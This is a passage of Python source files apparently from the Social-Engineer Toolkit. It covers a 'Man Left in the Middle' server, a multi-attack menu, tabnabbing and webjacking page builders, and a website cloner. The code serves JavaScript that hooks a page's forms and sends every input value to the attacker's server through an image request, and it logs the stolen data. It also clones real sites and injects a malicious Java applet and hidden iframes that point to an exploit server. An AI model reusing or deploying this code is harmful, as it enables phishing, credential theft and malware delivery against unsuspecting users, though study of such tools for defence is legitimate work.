from src.core import setcore

# GRAB DEFAULT PORT FOR WEB SERVER
fileopen=file("config/set_config" , "r").readlines()
counter=0
for line in fileopen:
    line=line.rstrip()
    match=re.search("MLITM_PORT=", line)
    if match:
        port=line.replace("MLITM_PORT=", "")
        counter=1

# if nada default port 80
if counter == 0: web_port=8000

# Interface you want to bind to
bind = "0.0.0.0"
# Location of reports
reports = "./reports"


class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        try:
            if re.search("^https?:\/\/(:?localhost|127)", self.headers["Referer"]) is None:


                if self.path == '/':
                    print '[-] Incoming connection from %s' % self.client_address[0]
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/javascript')
                    self.send_header('Cache-Control', 'no-cache, must-revalidate')
                    self.end_headers()

                    print '[-] Grabbing payload from %s' % self.headers["Referer"]
                    self.prep_payload()

                    self.wfile.write(self.send_payload())

                    print '[-] Exploit sent to %s' % self.client_address[0]
                elif self.path[0:11] == '/spacer.gif':
                    print '[*] Receiving data from %s' % self.client_address[0]
                    self.referer_host = self.headers["Referer"].replace("https://","").replace("http://","")
                    self.referer_host = self.referer_host.split("/")[0].split(".")
                    self.referer_host = self.referer_host[-2]+"."+self.referer_host[-1]
                    print self.referer_host
                    self.send_response(200)
                    self.send_header('Content-Type', 'image/gif')
                    self.send_header('Cache-Control', 'no-cache, must-revalidate')
                    self.end_headers()
                    self.capture()


            else:
                #self.headers["Referer"] = "http://google.com/"
                print '[-] Incoming connection from %s' % self.client_address[0]
                print '[!] No referer'
        except KeyError:
            #self.headers["Referer"] = "http://google.com/"
            print '[-] Incoming connection from %s' % self.client_address[0]
            print '[!] No referer'

    def send_payload(self):
        return self.payload

    def prep_payload(self):
        js_payload = {}
        js_payload[0]  = """
                        function func() {
                                document.getElementsByTagName('body')[0].innerHTML = \""""
        js_payload[2]  = """\";

                        var formslength =document.getElementsByTagName('form').length;
                        for(var i=0; i<formslength; i++){
                                document.forms[i].setAttribute('onsubmit', 'myOnSubmit('+i+')');
                        }
                }

                function myOnSubmit(form) {
                        data = \"\";
                        for (i=0; i < document.forms[form].getElementsByTagName(\"input\").length; i++){
                                        data = data+document.forms[form].getElementsByTagName(\"input\")[i].name+\"=\"+document.forms[form].getElementsByTagName(\"input\")[i].value+\"&\";
                        }

                        var img = document.createElement('img');
                        img.src = \""""
        js_payload[4] = """?\"+data+\"\";
                                img.setAttribute('width', '100%');
                                img.setAttribute('height', '100%');
                                document.getElementsByTagName('body')[0].appendChild(img);
                                pause(500);
                                return true;
                        }

                        function pause(milsec){
                                var date = new Date();
                                var curDate = null;
                                do { curDate = new Date(); }
                                while(curDate-date < milsec);
                        }

                        func();
                        document.execCommand('Stop');
                        """

        js_payload[1] = str(self.served())
        js_payload[1] = js_payload[1].replace("\"","\\\"")
        js_payload[3] = "http://"+self.headers["host"]+"/spacer.gif"
        full_payload = ""
        js_payload[1] = js_payload[1].replace("\t","").replace("\n","").replace("\r","")

        for i in js_payload:
            full_payload += str(js_payload[i])
        self.payload = full_payload

    def served(self):
        t = urllib2.urlopen(self.headers["Referer"])
        html = t.read()
        soup = BeautifulSoup.BeautifulSoup(html)
        body = soup.find(["body"])
        return body

    def capture(self):
        self.generated_on = str(datetime.datetime.now())
        self.path = self.path.split("?")[1].split(" ")[0]
        dict = urlparse.parse_qs(self.path)

        meta = {}
        meta['ip'] = self.client_address
        meta['browser'] = [self.headers["User-Agent"]]
        meta['referer'] = [self.headers["Referer"]]

        print "[+] Generating XML.."

        root = Element('XSS')
        root.set('version', '1.0')
        request = SubElement(root, 'request')

        site = SubElement(request, 'site')
        site.text = self.address_string()
        date = SubElement(request, 'date')
        date.text = self.generated_on
        requestLine = SubElement(request, 'requestLine')
        requestLine.text = self.requestline

        metaData = SubElement(request, 'meta')
        for key, value in meta.iteritems():
            ele = SubElement(metaData, key)
            ele.text = value[0]


        formData = SubElement(request, 'formData')

        print '[*] Data received:'
        for key, value in dict.iteritems():
            if key == "":
                key = "UNDEFINED"
            print '[-] \t '+ str(key)+' => '+str(value)
            ele = SubElement(formData, key)
            ele.text = value[0]


        self.log_data(self.prettify(root))


    def prettify(self,elem):
        """Return a pretty-printed XML string for the Element.
        """
        rough_string = ElementTree.tostring(elem, 'utf-8')
        reparsed = minidom.parseString(rough_string)
        return reparsed.toprettyxml(indent="  ")

    def log_data(self,data):
        report = open(reports+"/"+self.referer_host+"_"+self.generated_on.replace(" ","_").replace(":",".")+".xml","w+")
        report.write(data)
        report.close


print setcore.bcolors.BLUE + "\n***************************************************"
print setcore.bcolors.YELLOW + "  Web Server Launched. Welcome to the SET MLTM."
print setcore.bcolors.BLUE + "***************************************************"
print setcore.bcolors.BLUE + "Man Left in the Middle Attack brought to you by:\nKyle Osborn - kyle@kyleosborn.com" + setcore.bcolors.ENDC
print "\nStarting server on %s:%s..." % (bind,port)
try:
    serv = HTTPServer((bind, int(port)), RequestHandler)
    print setcore.bcolors.GREEN + "[*] Server has started" + setcore.bcolors.ENDC
    serv.serve_forever()
except Exception, e:
    print e
    print "Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port)

########NEW FILE########
__FILENAME__ = multiattack
#!/usr/bin/env python
import re
import sys
import os
import subprocess
import time
import signal

# Grab the central imports
definepath = os.getcwd()
sys.path.append(definepath)
from src.core.setcore import *

operating_system = check_os()
me = mod_name()
#######################################################
# Heres the brains behind the multiattack vector.
# This preps each check and payload for each attack
# vector.
#######################################################

def return_menu():
    print_status("Option added. You may select additional vectors")
    time.sleep(2)
    print("""\nSelect which additional attacks you want to use:\n""")

# option designators needed to ensure its defined ahead of time
java_applet="off"
meta_attack="off"
harvester="off"
tabnabbing="off"
mlitm="off"
webjacking="off"

# turning flag on
def flag_on(vector):
    print_info("Turning the %s Attack Vector to " % (vector) + bcolors.GREEN + "ON" + bcolors.ENDC)

# turning flag off
def flag_off(vector):
    print_info("Turning the %s Attack Vector to " % (vector) + bcolors.RED + "OFF" + bcolors.ENDC)

# filewriting
def write_file(filename,results):
    filewrite=file(setdir + "/%s" % (filename), "w")
    filewrite.write(results)
    filewrite.close()

# specify attackvector
filewrite=file(setdir + "/attack_vector","w")
filewrite.write("multiattack")
filewrite.close()

# on and off switch detection variable
trigger=""

# set toggle flags here
toggleflag_java=(bcolors.RED+" (OFF)" + bcolors.ENDC)
toggleflag_meta=(bcolors.RED+" (OFF)" + bcolors.ENDC)
toggleflag_harv=(bcolors.RED+" (OFF)" + bcolors.ENDC)
toggleflag_tabnab=(bcolors.RED+" (OFF)" + bcolors.ENDC)
toggleflag_mlitm=(bcolors.RED+" (OFF)" + bcolors.ENDC)
toggleflag_webjacking=(bcolors.RED+" (OFF)" + bcolors.ENDC)

# grab current path
definepath=os.getcwd()

# default flag for webdav to be off
webdav_enable="OFF"

# see if we are running a custom cloned website
clonedurl = 0
fileopen = file(setdir + "/site.template", "r")
data = fileopen.read()
if "TEMPLATE=SELF" in data:
    clonedurl = 1

# clean up cloner directory
if clonedurl == 0:
    subprocess.Popen("rm -rf %s/web_clone;mkdir %s/web_clone/" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# set a quick loop to see what the user wants
a=1

print ("""
[*************************************************************]

                Multi-Attack Web Attack Vector

[*************************************************************]

 The multi attack vector utilizes each combination of attacks
 and allow the user to choose the method for the attack. Once
 you select one of the attacks, it will be added to your
 attack profile to be used to stage the attack vector. When
 your finished be sure to select the 'I'm finished' option.""")
print("""\nSelect which attacks you want to use:
""")

while a==1:
    trigger=""
    print "   1. Java Applet Attack Method" + toggleflag_java
    print "   2. Metasploit Browser Exploit Method" + toggleflag_meta
    print "   3. Credential Harvester Attack Method" + toggleflag_harv
    print "   4. Tabnabbing Attack Method" + toggleflag_tabnab
    print "   5. Web Jacking Attack Method" + toggleflag_webjacking
    print "   6. Use them all - A.K.A. 'Tactical Nuke'"
    print "   7. I'm finished and want to proceed with the attack"
    print "\n  99. Return to Main Menu\n"


    profile=raw_input(setprompt(["2","16"], "Enter selections one at a time (8 to finish)"))

    if profile == "": profile = "7"
    # if the option is something other than 1-7 flag invalid option
    # this will make sure its an integer, if not assign an 9 which will trigger invalid option
    try:    # this will trigger an error if it isnt an integer
        profile=int(profile)
        # convert it back
        profile=str(profile)
    # if it triggers an exception reassign profile to option 8
    except: profile = "10"

    # if you want to return to main menu
    if profile == "99":
        break

    # trigger invalid option
    if int(profile) >= 10:
        raw_input("\nInvalid option..")
        return_continue()

    if profile == "6":
        if operating_system == "windows":
            print_warning("Sorry this option is not available in Windows")
            return_continue()
        if operating_system != "windows":
            print bcolors.RED + (r"""
                          ..-^~~~^-..
                        .~           ~.
                       (;:           :;)
                        (:           :)
                          ':._   _.:'
                              | |
                            (=====)
                              | |
                              | |
                              | |
                           ((/   \))""") + bcolors.ENDC

            print "\nSelecting everything SET has in its aresenal, you like sending a nuke don't you?"
            print "\n[*] Note that tabnabbing is not enabled in the tactical nuke, select manually if you want.\n"
            java_applet="on"
            meta_attack="on"
            harvester="on"
            break

    if profile == "7":
        break

    # java applet on/off
    if profile == "1":
        if java_applet == "off":
            flag_on("Java Applet")
            return_menu()
            java_applet="on"
            trigger=1
            #toggle_flags here
            toggleflag_java=(bcolors.GREEN+" (ON)" + bcolors.ENDC)

        if java_applet == "on":
            if trigger != 1:
                flag_off("Java Applet")
                return_menu()
                java_applet="off"
                # toggle flags here
                toggleflag_java=(bcolors.RED+" (OFF)" + bcolors.ENDC)

    # metasploit client_side on/off
    if profile == "2":
        if operating_system == "windows":
            print_warning("Sorry this option is not available in Windows")
            return_continue()
        if operating_system != "windows":
            if meta_attack=="off":
                flag_on("Metasploit Client Side")
                return_menu()
                meta_attack="on"
                trigger=1
                # toggle flags here
                toggleflag_meta=(bcolors.GREEN+" (ON)" + bcolors.ENDC)

            if meta_attack=="on":
                if trigger != 1:
                    flag_off("Metasploit Client Side")
                    return_menu()
                    meta_attack="off"
                    # toggle flags here
                    toggleflag_meta=(bcolors.RED+" (OFF)" + bcolors.ENDC)


    # harvester on/off
    if profile == "3":
        if harvester == "off":
            flag_on("Harvester")
            return_menu()
            harvester="on"
            trigger=1
            # toggle flags here
            toggleflag_harv=(bcolors.GREEN+" (ON)" + bcolors.ENDC)
            if mlitm == "on":
                mlitm="off"
                toggleflag_mlitm=(bcolors.RED+" (OFF)" + bcolors.ENDC)

        if harvester == "on":
            if trigger != 1:
                flag_off("Harvester")
                return_menu()
                harvester="off"
                # toggle flags here
                toggleflag_harv=(bcolors.RED+" (OFF)" + bcolors.ENDC)

    # if tabnabbing is enabled, no need for harvester to be enabled as well
    if profile == "4":
        if tabnabbing == "off":
            flag_on("Tabnabbing")
            return_menu()
            tabnabbing="on"
            trigger=1
            harvester="on"
            # toggle flags here
            toggleflag_tabnab=(bcolors.GREEN+" (ON)" + bcolors.ENDC)
            if mlitm == "on":
                mlitm="off"
                toggleflag_mlitm=(bcolors.RED+" (OFF)" + bcolors.ENDC)
            print webjacking
            if webjacking == "on":
                webjacking = "off"
                toggleflag_webjacking=(bcolors.RED+" (OFF)" + bcolors.ENDC)

        if tabnabbing == "on":
            if trigger != 1:
                flag_off("Tabnabbing")
                return_menu()
                tabnabbing="off"
                harvester="off"
                # toggle flags here
                toggleflag_tabnab=(bcolors.RED+" (OFF)" + bcolors.ENDC)

    # turn webjacking on
    if profile== "5":

        if webjacking == "off":
            flag_on("Web Jacking")
            webjacking="on"
            return_menu()
            trigger=1
            if tabnabbing == "on" or mlitm == "on":
                print "[*] You cannot use MLITM and Tabnabbing in the same attack!"
                print "[*] Disabling MLITM and/or Tabnabbing"
                mlitm="off"
                tabnabbing="off"
                harvester="on"
                # toggle flags here
                toggleflag_mlitm=(bcolors.GREEN+" (ON)" + bcolors.ENDC)
                toggleflag_tabnab=(bcolors.RED+" (OFF)" + bcolors.ENDC)
                toggleflag_harv=(bcolors.GREEN+" (ON)" + bcolors.ENDC)
            if harvester == "off":
                harvester="on"
                toggleflag_harv=(bcolors.GREEN+" (ON)" + bcolors.ENDC)
            toggleflag_webjacking=(bcolors.GREEN+" (ON)" + bcolors.ENDC)

        if webjacking == "on":
            if trigger != 1:
                flag_off("Web Jacking")
                return_menu()
                webjacking="off"
                # toggle flags here
                toggleflag_webjacking=(bcolors.RED+" (OFF)" + bcolors.ENDC)


# next series of flags needed
payloadgen=0

# write handler files for detection
if java_applet == "on":
    write_file("multi_java","multiattack=java_on")
if meta_attack == "on":
    write_file("multi_meta","multiattack=meta_on")
if tabnabbing == "on":
    write_file("multi_tabnabbing","multiattack=tabnabbing_on")
if harvester == "on":
    write_file("multi_harvester","multiattack=harvester_on")
if mlitm == "on":
    write_file("multi_mlitm","multiattack=mlitm_on")
if webjacking == "on":
    write_file("multi_webjacking","multiattack=webjacking_on")

# hit cloner flag
# if any of the flags are turned on, then trigger to see if ARP Cache needs to be enabled
if java_applet =="on" or meta_attack == "on" or harvester == "on" or tabnabbing == "on" or mlitm == "on":

    # web cloner start here
    sys.path.append("src/webattack/web_clone")
    debug_msg(me,"importing 'src.webattack.web_clone.cloner'",1)
    try: reload(cloner)
    except: import cloner

    # arp cache attack, will exit quickly
    # if not in config file
    if operating_system != "windows":
        sys.path.append("src/core/arp_cache")
        debug_msg(me,"importing 'src.core.arp_cache.arp'",1)
        try: reload(arp)
        except: import arp

# start the stuff for java applet
if java_applet == "on":
    sys.path.append("src/core/payloadgen/")
    debug_msg(me,"importing 'src.core.payloadgen.create_payloads'",1)
    try: reload(create_payloads)
    except: import create_payloads
    payloadgen=1
    applet_choice()

# start the stuff for metasploit client side
if meta_attack == "on":
    sys.path.append("src/webattack/browser_exploits/")
    import gen_payload

    # this checks to see if the MSF payload uses webdav, if so we have to force port 80
    if os.path.isfile(setdir + "/webdav_enabled"):
        webdav_enabled="on"

# set this incase msf attack, java applet, and harvester is needed
pexpect_flag="off"

# start the stuff for harvester
if harvester == "on" or tabnabbing == "on" or webjacking == "on":
    if tabnabbing == "on" or webjacking == "on":
        # if tabnabbing is on, set th tabnabbing to on
        sys.path.append("src/webattack/tabnabbing")
        debug_msg(me,"importing 'src.webattack.tabnabbing.tabnabbing'",1)
        try: reload(tabnabbing)
        except: import tabnabbing
    # if the harvester is on set the multi_harvester flag
    sys.path.append("src/webattack/harvester")
    if java_applet == "on" or meta_attack == "on":
        pexpect_flag="on"
        a=subprocess.Popen("python src/webattack/harvester/harvester.py", shell=True)

# start stuff for mlitm
if mlitm == "on":
    sys.path.append("src/webattack/mlitm")
    if java_applet == "on" or meta_attack == "on":
        a=subprocess.Popen("python src/mlitm/mlitm.py")
    else:
        debug_msg(me,"importing 'src.mlitm.mlitm'",1)
        try: reload(mlitm)
        except: import mlitm

# start the web server
if java_applet == "on" or meta_attack == "on":
    sys.path.append("src/html/")
    debug_msg(me,"importing 'src.html.spawn'",1)
    try: reload(spawn)
    except: import spawn

    # if using cred harvester or tabnabbing
    if harvester == "on" or tabnabbing == "on":
        os.chdir(definepath)
        sys.path.append("%s/src/webattack/harvester/" % (definepath))
        import report_generator
        try:
            # a.terminate only works on Python > 2.6
            a.terminate()
        except AttributeError:
            # if it fails pull pid for subprocess thread then terminate it
            os.kill( a.pid , signal.SIGTERM)
        print_status("\nReport exported.")
        return_continue()

########NEW FILE########
__FILENAME__ = webprofiler
#!/usr/bin/python
#
# victim profile code here
#

from src.core.setcore import return_continue, print_info

def prep_website():
    print_info("This feature is currently under development and disabled.")
    return_continue()

prep_website()

########NEW FILE########
__FILENAME__ = tabnabbing
#!/usr/bin/env python
import subprocess
import re
import urllib2
import os
from src.core.setcore import *
#
# TabNabbing Source here
#
#

# pull the timing for SET CONFIG on webjacking
fileopen=file("config/set_config", "r")
for line in fileopen:
    match=re.search("WEBJACKING_TIME=", line)
    if match:
        line=line.replace("WEBJACKING_TIME=", "")
        webjacking_timing=line

# grab attack_vector specification
fileopen=file(setdir + "/attack_vector", "r")
for line in fileopen:
    attack_vector=line.rstrip()

# need to see if we created file to trigger multi attack webjacking
multi_webjacking="off"
if os.path.isfile(setdir + "/multi_webjacking"):
    multi_webjacking="on"


# Open the IPADDR file
ipaddr=""
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")

# pull URL field so we can pull favicon later on
fileopen=file(setdir + "/site.template","r").readlines()
for line in fileopen:
    match=re.search("URL=",line)
    if match:
        URL=line.replace("URL=", "")
        if attack_vector == "tabnabbing":
            URL=URL.replace("https://", "")
            URL=URL.replace("http://", "")
            URL=re.split("/", URL)
            URL=URL[0]
            URL="http://"+URL

# move cloned site to index2.html
subprocess.Popen("mv %s/web_clone/index.html %s/web_clone/index2.html" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# grab the source and write it out to the cloned directory
fileopen=file("src/webattack/tabnabbing/source.js", "r")
# write it to dir
filewrite=file(setdir + "/web_clone/source.js", "w")
# loop
for line in fileopen:
    line=line.rstrip()
    match=re.search("URLHERE", line)
    if match:
        line=line.replace("URLHERE", URL)
    filewrite.write(line+"\n")
filewrite.close()

if attack_vector == "tabnabbing":
    # grab favicon
    favicon = urllib2.urlopen("%s/favicon.ico" % (URL))
    output = open(setdir + '/web_clone/favicon.ico','wb')
    output.write(favicon.read())
    output.close()
    filewrite1=file(setdir + "/web_clone/index.html", "w")
    filewrite1.write('<head><script type="text/javascript" src="source.js"></script></head>\n')
    filewrite1.write("<body>\n")
    filewrite1.write("Please wait while the site loads...\n")
    filewrite1.write("</body>\n")
    filewrite1.close()

# define webjacking or multi webjacking here
if attack_vector == "webjacking" or multi_webjacking == "on":
    filewrite1=file(setdir + "/web_clone/index.html", "w")
    filewrite1.write("<script>\n")
    filewrite1.write("function a(){\n")
    filewrite1.write('''a= window.open("http://%s/index2.html", "iframe", "");\n''' % (ipaddr));
    filewrite1.write("}\n")
    filewrite1.write("</script>\n")
    filewrite1.write('''<a href="%s" onclick="t=setTimeout('a()', %s);" target="iframe"><h1>The site %s has moved, click here to go to the new location.</h1></a>\n''' % (URL,webjacking_timing,URL))
    filewrite1.close()

########NEW FILE########
__FILENAME__ = cloner
#!/usr/bin/env python
#########################################################################
# This file clones a website for SET to use in conjunction with the java
# applet attack.
#########################################################################
from src.core.setcore import *
import subprocess
import os
import sys
import time
import re
import shutil
import urllib2

operating_system = check_os()
definepath=os.getcwd()

from config.set_config import USER_AGENT_STRING as user_agent
from config.set_config import WEB_PORT as web_port
from config.set_config import JAVA_ID_PARAM as java_id
from config.set_config import JAVA_REPEATER as java_repeater  #Boolean
from config.set_config import JAVA_TIME as java_time
from config.set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
from config.set_config import AUTO_REDIRECT as auto_redirect  #Boolean
from config.set_config import UNC_EMBED as unc_embed          #Boolean

track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

## Open the IPADDR file
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = raw_input("Enter your IP address: ")
    update_options("IPADDR=" + ipaddr)

## Define base value
site_cloned = True

## GRAB DEFAULT PORT FOR WEB SERVER
meterpreter_iframe="8080"

## make dir if needed
if not os.path.isdir(setdir + "/web_clone/"):
    os.makedirs(setdir + "/web_clone")

## if we used a proxy configuration from the set-proxy
if os.path.isfile(setdir + "/proxy.confg"):

    fileopen=file(setdir + "/proxy.config", "r")
    proxy_config = fileopen.read().rstrip()

## just do a ls
if not os.path.isfile(setdir + "/proxy.confg"): proxy_config = "ls"

## if counter == 0: web_port=80

webdav_meta=0
## see if exploit requires webdav
try:
    fileopen=file(setdir + "/meta_config", "r")
    for line in fileopen:
        line=line.rstrip()
        match=re.search("set SRVPORT 80", line)
        if match:
            match2=re.search("set SRVPORT %s" % (metasploit_iframe), line)
            if not match2:
                webdav_meta=80
except:
    pass

template=""
## Grab custom or set defined
fileopen=file(setdir + "/site.template","r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("TEMPLATE=", line)
    if match:
        line=line.split("=")
        template=line[1]

## grab attack_vector specification
attack_vector=""
if os.path.isfile(setdir + "/attack_vector"):
    fileopen=file(setdir + "/attack_vector", "r").readlines()
    for line in fileopen:
        attack_vector=line.rstrip()

# generate a random string for obfsucation we will do the same for nix and mac bins

# windows executable random name
rand_gen_win = generate_random_string(6, 15)
# mac elf binary random name
rand_gen_mac = generate_random_string(6, 15)
# nix elf binary random name
rand_gen_nix = generate_random_string(6, 15)

try:
    ## open our config file that was specified in SET
    fileopen=file(setdir + "/site.template", "r").readlines()
    ## start loop here
    url_counter=0
    for line in fileopen:
        line=line.rstrip()
        ## look for config file and parse for URL
        match=re.search("URL=",line)
        if match:
        ## replace the URL designator with nothing
            line=line.replace("URL=","")
            ## define url to clone here
            url=line.rstrip()

    ## if we aren't using multi attack with templates do this
    if url != "NULL":
        if template !="SET":
            print bcolors.YELLOW + "\n[*] Cloning the website: "+(url)
            print "[*] This could take a little bit..." + bcolors.ENDC

    ## clone the website
    if template != "SELF":
        ## clean up old stuff
        ## set counter
        counter=0
        # try except block in case no internet connection, route to Internet, etc.
        try:
                # check if we have wget, if we don't then use urllib2
            wget = 0
            if os.path.isfile("/usr/local/bin/wget"):
                wget = 1
            if os.path.isfile("/usr/bin/wget"):
                wget = 1
            if os.path.isfile("/usr/local/wget"):
                wget = 1

            if wget == 1:
                subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (proxy_config,setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

            if wget == 0:
                # if we don't have wget installed we will use python to rip, not as good as wget
                headers = { 'User-Agent' : user_agent }
                # read in the websites
                req = urllib2.Request(url, None, headers)
                # read in the data from the initial request
                html = urllib2.urlopen(req).read()
                # if length isnt much then we didnt get the site cloned
                if len(html) > 1:
                    # if the site has cloned properly
                    site_cloned = True
                    # open file for writing
                    filewrite = file(setdir + "/web_clone/index.html", "w")
                    # write the data back from the request
                    filewrite.write(html)
                    # close the file
                    filewrite.close()

        # if it failed ;(
        except:
            pass

        ## If the website did not clone properly, exit out.
        if not os.path.isfile(setdir + "/web_clone/index.html"):
            print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
            return_continue()
            site_cloned = False
            ## add file to let set interactive shell know it was unsuccessful
            filewrite=file(setdir + "/cloner.failed" , "w")
            filewrite.write("failed")
            filewrite.close()

        if os.path.isfile(setdir + "/web_clone/index.html"):
            fileopen = file(setdir + "/web_clone/index.html", "r")
            counter = 0
            for line in fileopen:
                counter = counter + 1
            if counter == 1 or counter == 0:
                print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
                return_continue()
                site_cloned = False
                os.remove(setdir + "/web_clone/index.html")

                ## add file to let set interactive shell know it was unsuccessful
                filewrite=file(setdir + "/cloner.failed" , "w")
                filewrite.write("failed")
                filewrite.close()

        if site_cloned == True:

            ## make a backup of the site if needed
            shutil.copyfile(setdir + "/web_clone/index.html", setdir + "/web_clone/index.html.bak")


    if site_cloned == True:

        # if we specify UNC embedding
        if unc_embed == True:
            fileopen=file(setdir + "/web_clone/index.html","r")
            index_database = fileopen.read()
            filewrite = file(setdir + "/web_clone/index.html", "w")

            ## Open the UNC EMBED
            fileopen4=file("src/webattack/web_clone/unc.database", "r")
            unc_database = fileopen4.read()
            unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
            unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
            match = re.search("</body.*?>", index_database)
            if match:
                index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
            if not match:
                index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)

            filewrite.write(index_database)
            filewrite.close()

        ## java applet attack vector

        ## check for java flag for multi attack
        multi_java=False
        if os.path.isfile(setdir + "/multi_java"):
            multi_java=True

        if attack_vector == "java" or multi_java:
            ## Here we parse through the new website and add our java applet code, its a hack for now
            ## Wrote this on the plane to Russia, easiest way to do this without internet access :P
            print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
            ## Read in newly created index.html
            time.sleep(2)
            if not os.path.isfile(setdir + "/web_clone/index.html"):
                ## trigger error that we were unable to grab the website :(
                print_error("Unable to clone the website it appears. Email us to fix.")
                sys.exit()

            fileopen=file(setdir + "/web_clone/index.html","r")
            ## Read add-on for java applet
            fileopen2=file("src/webattack/web_clone/applet.database" , "r")
            ## Write to new file with java applet added
            filewrite=file(setdir + "/web_clone/index.html.new", "w")
            fileopen3=file("src/webattack/web_clone/repeater.database", "r")

            ## this is our cloned website
            index_database = fileopen.read()
            ## this is our applet database
            applet_database = fileopen2.read()
            ## this is our repeater database
            repeater_database = fileopen3.read()

            ## here we begin replacing specifics in order to prep java applet payload
            applet_database = applet_database.replace("msf.exe", rand_gen_win)
            applet_database = applet_database.replace("mac.bin", rand_gen_mac)
            applet_database = applet_database.replace("nix.bin", rand_gen_nix)
            update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))

            ## close the file up
            applet_database = applet_database.replace("ipaddrhere", ipaddr + ":" + str(web_port))

            ## set the java field
            applet_database = applet_database.replace("IDREPLACEHERE", java_id, 2)

            ## set up everything for the unc path
            if unc_embed == True:
                unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
                unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)

            ## set up the java repeater
            if java_repeater == True:
                repeater_database = repeater_database.replace("IDREPLACEHERE", java_id, 2)
                repeater_database = repeater_database.replace("TIMEHEREPLZ", java_time)
                repeater_database = repeater_database.replace("URLHEREPLZ", url)
                repeater_database = repeater_database.replace("RANDOMFUNCTION", generate_random_string(5,15), 3)

            ## do a quick sanity check and make sure body is standard
            index_database = re.sub("</BODY.*?>", "</body>", index_database)
            index_database = re.sub("<HEAD.*?>", "<head>", index_database)
            index_database = re.sub("<BODY.*?>", "<body>", index_database)

            ## start appending and prepping the index file
            if java_repeater == True:
                match = re.search("</body.*?>", index_database)
                if match:
                    index_database = re.sub("<applet ", repeater_database + "\n<applet ", index_database)
                if not match:
                    index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)

            counter = 0
            ## confirm we can find body
            match = re.search("</body.*?>", index_database)
            if match:
                counter = 1
                index_database = re.sub("</body.*?>", applet_database + "\n</body>", index_database)
                if auto_redirect == True:
                    index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))
            if not match:
                match = re.search("<head.*?>", index_database)
                if match:
                    counter = 1
                    index_database = re.sub("<head.*?>", "\n<head>" + applet_database, index_database)
                    if auto_redirect == True:
                        index_database = index_database.replace('<param name="9" value=""', '<param name="9" value="%s"' % (url))

            ## start appending and prepping the index file
            if java_repeater == True:
                match = re.search("</body.*?>", index_database)
                if match:
                    index_database = re.sub("<applet", repeater_database + "\n<applet ", index_database)
                if not match:
                    index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)


                if counter == 0:
                    print_error("Unable to clone the website...Sorry.")
                    print_error("This is usally caused by a missing body tag on a website.")
                    print_error("Try a diferent site and attempt it again.")
                    sys.exit(1)

            ## write the file out
            filewrite.write(index_database)

            ## close the file after done writing
            filewrite.close()

            print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC


        ## selection of browser exploits
        ## check to see if multiattack is in use
        multi_meta="off"
        if os.path.isfile(setdir + "/multi_meta"):
            multi_meta="on"

        if attack_vector == "browser" or multi_meta=="on":
            print bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC
            ## Read in newly created index.html
            if attack_vector == "multiattack":
                if os.path.isfile(setdir + "/web_clone/index.html"): os.remove(setdir + "/web_clone/index.html")
                # check to see if the file is there first
                if not os.path.isfile(setdir + "/web_clone/index.html.new"):
                    if os.path.isfile(setdir + "/web_clone/index.html.bak"):
                        shutil.copyfile(setdir + "/web_clone/index.html.bak", setdir + "/web_clone/index.html.new")
                if os.path.isfile(setdir + "/web_clone/index.html.new"):
                    shutil.copyfile(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
                time.sleep(1)
            fileopen=file(setdir + "/web_clone/index.html","r").readlines()
            filewrite=file(setdir + "/web_clone/index.html.new", "w")
            counter=0
            for line in fileopen:
                counter=0
                if attack_vector == "browser":
                    match=re.search("Signed_Update.jar", line)
                    if match:
                        line=line.replace("Signed_Update.jar", "invalid.jar")
                        filewrite.write(line)
                        counter=1

                match=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header=match.group(0)

                match2=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match2:
                    header=match.group(0)
                    if webdav_meta != 80:
                        line=line.replace(header, header+'<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>' % (ipaddr,metasploit_iframe))
                        filewrite.write(line)
                        counter=1
                    if webdav_meta == 80:
                        line=line.replace(header, header+'<head><meta HTTP-EQUIV="REFRESH" content="4; url=http://%s">' % (ipaddr))
                if counter == 0: filewrite.write(line)

            try: filewrite.close()
            except: pass
            print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC

        if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
            if not os.path.isfile(setdir + "/web_clone/Signed_Update.jar"):
                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/Signed_Update.jar")
            ## move index.html to our main website
            if os.path.isfile(setdir + "/web_clone/index.html.new"):
                shutil.move(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")

## catch keyboard control-c
except KeyboardInterrupt:
